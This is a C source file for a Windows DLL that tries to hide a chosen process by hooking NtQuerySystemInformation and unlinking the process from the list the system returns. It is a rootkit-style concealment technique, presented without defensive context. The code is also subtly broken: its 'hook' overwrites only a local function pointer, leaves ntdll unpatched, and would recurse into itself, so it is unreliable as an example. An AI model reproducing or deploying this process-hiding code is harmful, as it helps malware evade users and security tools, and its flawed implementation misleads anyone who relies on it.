#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *NtQuerySystemInformation_t)(
    SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG);

NtQuerySystemInformation_t OriginalNtQuerySystemInformation;
DWORD HiddenPID = 0;

NTSTATUS NTAPI HookedNtQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS SystemInformationClass, 
    PVOID SystemInformation, 
    ULONG SystemInformationLength, 
    PULONG ReturnLength)
{
    NTSTATUS status = OriginalNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
    
    if (SystemInformationClass == SystemProcessInformation && NT_SUCCESS(status)) {
        PSYSTEM_PROCESS_INFORMATION pCurrent = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
        PSYSTEM_PROCESS_INFORMATION pPrev = NULL;

        while (pCurrent) {
            if (pCurrent->UniqueProcessId == (HANDLE)HiddenPID) {
                if (pPrev) {
                    pPrev->NextEntryOffset += pCurrent->NextEntryOffset;
                } else {
                    pCurrent->NumberOfThreads = 0; // Hide it
                }
            }
            pPrev = pCurrent;
            if (pCurrent->NextEntryOffset == 0) break;
            pCurrent = (PSYSTEM_PROCESS_INFORMATION)((BYTE*)pCurrent + pCurrent->NextEntryOffset);
        }
    }
    return status;
}

// Function to start hiding the process
__declspec(dllexport) void HideProcess(DWORD pid) {
    HiddenPID = pid;

    // Hook NtQuerySystemInformation
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    OriginalNtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(ntdll, "NtQuerySystemInformation");

    DWORD oldProtect;
    VirtualProtect(OriginalNtQuerySystemInformation, sizeof(void*), PAGE_EXECUTE_READWRITE, &oldProtect);
    *((void**)&OriginalNtQuerySystemInformation) = HookedNtQuerySystemInformation;
    VirtualProtect(OriginalNtQuerySystemInformation, sizeof(void*), oldProtect, &oldProtect);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    return TRUE;
}
